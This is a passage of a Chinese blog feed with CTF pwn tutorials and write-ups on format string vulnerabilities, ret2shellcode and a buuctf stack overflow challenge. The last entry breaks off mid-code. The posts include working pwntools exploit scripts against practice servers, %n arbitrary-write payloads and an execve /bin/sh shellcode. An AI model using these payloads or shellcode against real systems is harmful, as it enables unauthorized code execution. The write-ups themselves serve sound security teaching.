      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串基础漏洞</title>
      <link href="/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>printf应该是我们学习c语言起使用的最频繁的函数了</p><p>其语法我们熟悉的不能再熟悉了—&gt;<strong>printf (“格式化字符串”,参量… )</strong></p><p>我们可以写一段代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然我们也可以这样写：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[]=<span class="string">&quot;chen&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种写法虽然没有格式化字符但是仍然可以输出chen这个字符串</p><p>那我们再看看第三种写法</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[]=<span class="string">&quot;%x%x%x&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我们没有给printf函数参数，只是仅仅给他格式化字符，猜一下，这次能成功吗，如果成功了，会输出什么？</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253626.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253626.png" alt="a"></a></p><p>输出了像地址的16进制？</p><p>我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？</p><p>我们用图来表示一下printf输出的时候栈结构是什么样子</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253171.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253171.png" alt="b"></a></p><p><strong>ps:关于这图，格式化字符串不一定要放在栈顶才能实现任意地址写入，注意别被误导了，下面会提一嘴</strong></p><p>如果我们只传入了格式化字符串而没有传入参数</p><p>那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)</p><p><strong>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束</strong></p><p>pwn题中的格式化字符串通常有两种出法</p><p>第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)，由于wp分类中的HUBU2022.fmt已经是这方面的例题了，这里不做额外的讲解，感兴趣的可以去wp分区中自行查看</p><p>第二种，也是难度较前者稍高，不好理解的一种</p><h2 id="任意内存的读取及任意内存写入"><a href="#任意内存的读取及任意内存写入" class="headerlink" title="任意内存的读取及任意内存写入"></a>任意内存的读取及任意内存写入</h2><p>我们首先得了解一个不常用的格式化字符串**%n**</p><p>他的作用是将在其之前打印出来的字节数赋值给指定的变量</p><p>比如: AAAA%n 就会赋值4给变量</p><p>如果我们后面跟上要修改的变量地址，就可以做到任意地址的写入</p><p>没懂？没关系来看一道例题</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/c.png" title="c" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/c.png" alt="c"></a></p><p>开了canary保护，大概率是格式化字符串</p><p>看看ida</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的&#x2F;dev&#x2F;urandom是什么？</p><p>我们只需要了解他是linux系统中的随机伪设备，他的作用就是提供永不为空的随机字节流</p><p>浅看一下他生成的字节流长什么样子</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253676.png" title="d" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022253676.png" alt="d"></a></p><p>说回这道题，看逻辑应该是要我们输入这个随机数，如果一样就调用system(&#x2F;bin&#x2F;sh)</p><p>而存放这个随机数的就是dword_804C044的地址</p><p>那我们这时候应该有两种想法，一种是泄露这个随机数，输入他</p><p>还有一种是通过修改这个随机数的值来判定成功</p><p>第一种办法本人是没法做出来，感兴趣的可以试一试</p><p>那么讲一下第二种办法，由上文的学习我们已经知道</p><p>要想用格式化字符串漏洞泄露栈上的内容，需要我们知道目标地址和格式化字符串存放的地址的偏移</p><p>用gdb看一下偏移</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/e.png" title="e" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/e.png" alt="e"></a></p><p>现在main函数处设置一个断点(这里由于main函数被删符号表了，所以b main的话gdb查找不到函数的，删符号表的体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数)</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/f.png" title="f" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/f.png" alt="f"></a></p><p>接着运行并且跳转到输入字符串这边，我们先输入8个A看一下栈分布的情况</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/h.png" title="h" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/h.png" alt="h"></a></p><p>这里还是先解释一下x&#x2F;20wx $esp这个命令是什么意思</p><p>其作用是用gdb查看内存 格式: x &#x2F;n u f <addr > </p><p>n是要显示的内存单元个数</p><p>f表示显示方式, 可取如下值</p><p>u表示一个地址单元的长度</p><p>这里的x&#x2F;20wx 的意思就是说查看20个4字节长度的内存单元 并且按16进制的格式显示</p><p>至于为什么是以esp为初始地址显示</p><p><strong>是因为格式化字符串%n进行任意地址改写是在ESP所指向的地址处所指向的地址处写入数据(可以理解为栈顶)</strong></p><p>所以我们需要知道当我们最终构造的payload中需要改写的地址内容距离esp的偏移是多少</p><p>而且也正是因为这一点，决定了我们可以不用一定要把格式化字符串放在栈顶</p><p>这里可以看到代表着AAAAAAAA的两个0x4141414141距离esp的偏移是10和11(如果我们只输入4个A只会占用偏移10这个字长，因为这是32位程序，等下编写exp的不要被搞晕了)</p><p>所以此时我们要如何构造我们的payload？</p><p>此时我们将格式化字符放在payload的最后</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line">payload = p32(addr)+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>由于此时程序是32位，%n前面传入的p32(addr)则为一个字长，四个字节，所以此时addr处的随机数就被我们修改为4</p><p>我们接着再输入4，就成功破解了随机数</p><p>学会了？觉得很简单？再来看一个比较绕的exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(&quot;node4.buuoj.cn&quot;,25117)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">addr = 0x0804C044</span><br><span class="line">payload = b&quot;AAAAAAA%13$n&quot;+p32(addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(&quot;7&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这次我们把addr放在后面传输了，可以看到和上文的区别是前面多了7个A而且这次随机数被我们修改成7了</p><p>看不懂没关系，接下来详解</p><p>我们再次明确一下概念，这里提到的偏移指的是距离esp的字长数</p><p>那么我们要实现改写的是addr这个地址的随机数对吧</p><p>此时我们先传入的是字符串“AAAAAAA%13$n”他的字节数是多少？</p><p>很明显是12个字节，也就是三个字长</p><p>我们之前通过gdb已经明白了，我们写入栈中的第一个字长是位于10偏移处，也就是AAAA</p><p>那么接下里的AAA%就会被写入11偏移</p><p>13$n就会被写入12偏移</p><p>而此时的addr就会被存放在13偏移处，所以此时我们的n就要从10更改为13</p><p>似乎有点能理解了是吧？</p><p>实际上pwntools中有一个函数，他可以自动帮我们生成这样的payload，而我们要做到的只是给予他基本的参数</p><p><strong>fmtstr_payload(offset, {addr: data})</strong></p><p>offset就是我们需要更改内容的地址距离esp的偏移</p><p>addr就是我们需要改写内容的地址</p><p>data就是我们需要改写的数据</p><p>来看一下接下来的exp可以怎么写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804C044</span>:<span class="number">1</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>可以看到，我们就这样轻易的将addr处的随机数更改为了1</p><p>是不是比之前的两种payload构造办法简单许多？</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ret2shellcode</title>
      <link href="/2022/09/21/Ret2shellcode/"/>
      <url>/2022/09/21/Ret2shellcode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这次我们再来介绍一个栈的经典题型</p><p>在我们先前遇到的题目中，都有着出题人为我们提供的后门函数，如果没有后门函数，我们又该如何自己构建shellcode呢？</p><p>带着这个疑问，我们开始今天的学习</p><h2 id="如何写入system（-bin-sh）？"><a href="#如何写入system（-bin-sh）？" class="headerlink" title="如何写入system（&#x2F;bin&#x2F;sh）？"></a>如何写入system（&#x2F;bin&#x2F;sh）？</h2><p>由于题目通常都会开启NX保护，所以我们要想在栈中写入字符串是不现实的打算</p><p>我们好好想想，在内存块的五个分区中，还有哪个区块是可以为我们自由编辑的，这里我们想到了用来存储未初始化的全局变量区bss段</p><p>那么如何写入呢？</p><p>我们先前已经知道了，计算机读不懂高级语言，即system(&#x2F;bin&#x2F;sh)</p><p>先前我们已经通过构造rop的方式用汇编语言指引执行流</p><p>这次我们尝试用机器码来将shellcode注入到内存中</p><p><strong>常用的shellcode：”\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</strong></p><p>这个shellcode只有23个字节，当题目的输入字长给的不够多的时候可以使用这个</p><p>当然还有第二种构造机器码的方式</p><p><strong>shellcode &#x3D; asm(shellcraft.sh())</strong></p><p>但是你很快就会发现，为什么自己在32位情况下可以使用，但是64位下就不行</p><p>我们还需要在后面加上amd64才能使其输出64位的机器码</p><p>当然我们也可以通过**context.arch &#x3D; “amd64”**来使环境转化为64位，于是我们在接下来即使不用amd64也能输出64位机器码</p><h2 id="例题解析"><a href="#例题解析" class="headerlink" title="例题解析"></a>例题解析</h2><p>这里以NewStarCTF 2022新生赛公开赛 的ret2shellcode作为例题讲解</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258964.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258964.png" alt="a"></a></p><p>老规矩看一下保护机制，NX开了，看来不能在栈上写入</p><p>ida看一下具体情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x233000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello my friend.Any gift for me?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Anything else?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok.See you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现了个mmap函数，用来干什么的？</p><p>可以简单理解为 开辟一块空间存放我们输入的值 其地址为第一个参数addr(0x233000)</p><p>那么我们的目的就是将shellcode写入这块空间，然后在接下来的栈溢出中控制程序执行流到shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25533</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello my friend.Any gift for me?&quot;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Anything else?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">56</span>)+p64(<span class="number">0x233000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>其实本质上还是栈溢出控制程序执行流到后门函数，只不过这个后门函数是我们自己存入到程序中的，还是挺好理解的</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn1_sctf_2016</title>
      <link href="/2022/09/19/pwn1-sctf-2016/"/>
      <url>/2022/09/19/pwn1-sctf-2016/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>buuctf中的一题，纯纯烧杯题，这题注重考查c++逆向(但是我还是觉得是动手调试的能力)</p><p>老规矩了，checksec看一下保护机制和位数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259960.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259960.png" alt="a"></a></p><p>感觉像是栈溢出，不确定，ida看看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259958.png" title="b" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259958.png" alt="b"></a></p><p>哇，看到这函数列表懵逼了，不过别怕，仔细翻一番</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259220.png" title="c" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259220.png" alt="c"></a></p><p>逮到三个看名字有用的，f5看一下</p><p><strong>main函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vuln函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, edata);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=();</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v6, s);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v5, <span class="string">&quot;you&quot;</span>, &amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(v8, v2);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v7, <span class="string">&quot;I&quot;</span>, v8);</span><br><span class="line">  replace((<span class="built_in">std</span>::<span class="built_in">string</span> *)v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::operator=(&amp;input, v4, v7, v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v7);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(v8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v5);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v6);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">std</span>::<span class="built_in">string</span>::c_str((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>gatflag函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看完人更傻了，虽然getflag明显就是要我们栈溢出，跳转到这个函数，但是vuln写的是什么？</p><p>百度完应该是c++中std::string相关的用法</p><p>不过这题应该是要我们会用<strong>debug</strong>来调试程序</p><p>我们重点注意一下那一串天书里面的“I”和“you”，突破口肯定是这俩</p><p>浅写段exp，debug看看有什么玄机</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29397</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span>  <span class="comment">#这段就是打开debug，具体是什么，下面看到图你就知道了</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">6</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259349.png" title="d" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259349.png" alt="d"></a></p><p>好家伙，我们可以看到明明传的是I，结果都变成了you，那到这里很明显了，这题就是把字符串中的i替换成了you</p><p>我们再来看看能不能进行栈溢出</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259603.png" title="e" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259603.png" alt="e"></a></p><p>可以看到，我们只能输入0x20字节的数据给s，但是他距离ebp有0x3c，不够怎么办？</p><p>刚才不是输入I可以变成you吗？这不是一个字节顶三个字节，一节更比一节强（南孚打钱）</p><p>那思路很明显了，输入20个字长的I，就相当于输入了60个字长的you，我们就可以进行栈溢出了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29397</span>)</span><br><span class="line">getflag_addr = <span class="number">0x8048f0d</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+cyclic(<span class="number">4</span>)+p32(getflag_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HUBUCTF-新生赛-fmt</title>
      <link href="/2022/09/18/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt/"/>
      <url>/2022/09/18/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>老规矩走个流程，checksec看一下保护机制</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259937.png" title="a" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022259937.png" alt="a"></a></p><p>好像看不出什么，猜不出他想干啥，拖到ida里面瞧瞧</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);                                                                                                                                                                       </span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span 